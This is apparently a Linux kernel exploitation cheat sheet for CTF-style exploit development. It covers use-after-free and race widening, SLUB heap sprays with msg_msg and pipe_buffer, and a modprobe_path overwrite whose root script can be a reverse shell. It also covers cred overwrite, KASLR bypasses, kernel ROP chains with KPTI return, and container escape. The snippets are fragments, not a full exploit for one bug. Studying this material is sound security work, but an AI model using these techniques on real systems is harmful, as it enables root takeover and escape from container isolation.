# Linux Kernel Exploitation

## Vulnerability Classes

### Use-After-Free (UAF)
```c
// Pattern: object freed while reference still held
// Exploit: reclaim freed memory with controlled data, trigger use of dangling pointer

// 1. Trigger free of target object
// 2. Spray objects of same size to reclaim the slab
// 3. Trigger use of dangling pointer → controlled vtable/function pointer
```

### Race Conditions
```c
// Pattern: TOCTOU between check and use, often in syscall handlers
// Exploit: race two threads — one modifies state between check and use

// Widening techniques:
// - userfaultfd: page fault handler pauses kernel mid-copy (pre-5.11 unprivileged)
// - FUSE: filesystem handler pauses kernel on file read
// - io_uring: async operations with controllable timing
// - CPU pinning: force threads onto same core for tighter races
```

### Out-of-Bounds (OOB)
```c
// Pattern: array index or memcpy size not properly validated
// Exploit: read/write adjacent slab objects

// Heap layout control:
// - Spray target objects adjacent to vulnerable object
// - Overflow into adjacent object's function pointer or data pointer
```

### Integer Overflow
```c
// Pattern: arithmetic on user-controlled size → undersized allocation
// size = user_count * sizeof(struct element)  // overflow wraps to small value
// buf = kmalloc(size, GFP_KERNEL);
// copy_from_user(buf, user_data, user_count * sizeof(struct element));  // copies more than allocated
```

## Exploitation Primitives

### Heap Spray (SLUB)
```c
// Linux kernel uses SLUB allocator — objects of similar size share slabs
// Key: spray objects of the SAME kmalloc cache as the target

// Common spray objects by size:
// kmalloc-8 to kmalloc-64: seq_operations (0x20), shm_file_data
// kmalloc-64 to kmalloc-128: subprocess_info, msg_msg header
// kmalloc-128 to kmalloc-256: setxattr (arbitrary size+content!)
// kmalloc-256 to kmalloc-512: sk_buff data
// kmalloc-1024+: msg_msg body, pipe_buffer, sendmsg

// setxattr spray (arbitrary size, arbitrary content, freed on return):
// setxattr("/tmp/x", "user.x", payload, size, 0);
// Useful for reclaiming freed objects with controlled content
```

### msg_msg for Arbitrary Read/Write
```c
// struct msg_msg: flexible-size kernel object (48-byte header + data)
// Allocated from kmalloc-64 through kmalloc-4096 depending on size
// Can be used for:
// 1. Heap spray (controlled size and content)
// 2. OOB read (corrupt m_ts/next to read adjacent memory)
// 3. Arbitrary free (corrupt m_list for unlink primitive)

// Send message (spray):
struct msgbuf { long mtype; char mtext[SIZE]; };
msgsnd(qid, &msg, SIZE, 0);

// Receive (free + read):
msgrcv(qid, &buf, SIZE, 0, IPC_NOWAIT);
```

### pipe_buffer for RIP Control
```c
// struct pipe_buffer has ops pointer (function table)
// Size: 40 bytes × nr_bufs, allocated from kmalloc-1024 (16 pipes)
// UAF on pipe_buffer → overwrite ops → control RIP on pipe close/read

// Spray:
int pipes[SPRAY_COUNT][2];
for (int i = 0; i < SPRAY_COUNT; i++) {
    pipe(pipes[i]);
    write(pipes[i][1], "A", 1);  // allocates pipe_buffer
}
// Free target, reclaim with controlled data containing fake ops pointer
// Close pipe → calls ops->release → RIP control
```

### Modprobe Path Overwrite
```c
// /proc/sys/kernel/modprobe contains path to module loader
// Default: /sbin/modprobe
// If you can write to this: point to your script
// Trigger: execute file with unknown binfmt header → kernel runs modprobe_path as root

// 1. Overwrite modprobe_path to "/tmp/pwn"
// 2. Create /tmp/pwn: #!/bin/sh\nchmod 777 /flag (or reverse shell)
// 3. Create /tmp/trigger with invalid header: \xff\xff\xff\xff
// 4. chmod +x /tmp/trigger && /tmp/trigger
// → kernel executes /tmp/pwn as root
```

### cred Structure Overwrite
```c
// struct cred contains uid, gid, capabilities
// If you can locate and overwrite current task's cred:
// Set uid=0, gid=0, cap_effective=0xffffffff

// Finding current cred:
// current_task → cred pointer → uid/gid/caps
// Offset varies by kernel version — extract from vmlinux or /proc/kallsyms
```

## KASLR Bypass Techniques

### /proc Leaks (if kptr_restrict=0)
```bash
cat /proc/kallsyms | grep commit_creds
# If kptr_restrict=1: shows 0000000000000000 for non-root
```

### Side Channels
```c
// EntryBLEED (CVE-2022-4543): timing difference on syscall entry
// Prefetch side channel: measure prefetch timing on kernel addresses
// TSX-based (if available): abort timing reveals valid kernel mappings
```

### Partial Overwrite
```c
// KASLR randomizes base but not relative offsets
// If you can corrupt low bytes of a kernel pointer:
// Only need to guess/brute 1-2 bytes (256-65536 attempts)
// Kernel text is 2MB-aligned → low 21 bits are fixed
```

### Info Leak via Uninitialized Memory
```c
// Kernel stack/heap may contain residual pointers from previous operations
// Trigger allocation → read before initialization → leak kernel pointers
// Common: recvmsg with uninitialized ancillary data, ioctl output buffers
```

## Kernel ROP

### Stack Pivot
```c
// Need to pivot RSP to controlled buffer
// Common gadgets:
// xchg eax, esp; ret  (if you control RAX)
// mov esp, [rdi]; ret (if you control RDI)
// push rax; ... ; pop rsp; ret

// After pivot, ROP chain in your controlled buffer:
// 1. prepare_kernel_cred(0)
// 2. commit_creds(result)
// 3. swapgs; iretq back to userspace (or kpti trampoline)
```

### KPTI Bypass (Return to Userspace)
```c
// With KPTI, can't just iretq — need to go through trampoline
// swapgs_restore_regs_and_return_to_usermode (symbol in kallsyms)

// ROP chain ending:
// ... commit_creds ...
// pop rdi; ret
// 0 (dummy)
// swapgs_restore_regs_and_return_to_usermode + offset
// 0, 0  (padding)
// user_rip (shell function)
// user_cs
// user_rflags
// user_sp
// user_ss

// Save userspace state before exploit:
void save_state() {
    asm("mov user_cs, cs; mov user_ss, ss; mov user_sp, rsp;"
        "pushf; pop user_rflags;");
}
```

### ret2usr (No SMEP/SMAP)
```c
// If SMEP/SMAP disabled: kernel can execute/read userspace memory
// Place payload in userspace, redirect kernel execution there

void payload() {
    commit_creds(prepare_kernel_cred(0));
    // return to userspace...
}
// Overwrite function pointer with &payload
```

## Namespace / Container Escape

```c
// From within container (unprivileged namespace):
// 1. Exploit kernel vuln → get kernel code execution
// 2. Overwrite current task's nsproxy to init_nsproxy
// 3. Overwrite current task's cred to init_cred
// 4. Now in root namespace with full privileges

// Key structures:
// task_struct → nsproxy → mnt_ns, pid_ns, net_ns, etc.
// task_struct → cred → uid, capabilities
// init_nsproxy and init_cred are at fixed offsets from kernel base
```

## Tools

| Tool | Purpose |
|------|---------|
| GEF/pwndbg + QEMU | Kernel debugging setup |
| syzkaller | Kernel fuzzer (finds bugs) |
| kASLR bypass scripts | Various side-channel implementations |
| extract-vmlinux | Extract vmlinux from bzImage |
| vmlinux-to-elf | Add symbols to extracted kernel |
| pahole | Show kernel structure layouts |
| /proc/kallsyms | Symbol addresses (if accessible) |
| crash / drgn | Kernel crash dump analysis |

## QEMU Testing Setup

```bash
# Minimal kernel exploit dev environment
qemu-system-x86_64 \
    -kernel bzImage \
    -initrd rootfs.cpio.gz \
    -append "console=ttyS0 nokaslr nopti nosmap nosmep" \
    -nographic \
    -monitor /dev/null \
    -s  # GDB on port 1234

# GDB attach
gdb vmlinux -ex "target remote :1234"

# Enable/disable mitigations for testing:
# nokaslr, nopti, nosmap, nosmep, noxsave
# Remove these flags to test with mitigations enabled
```
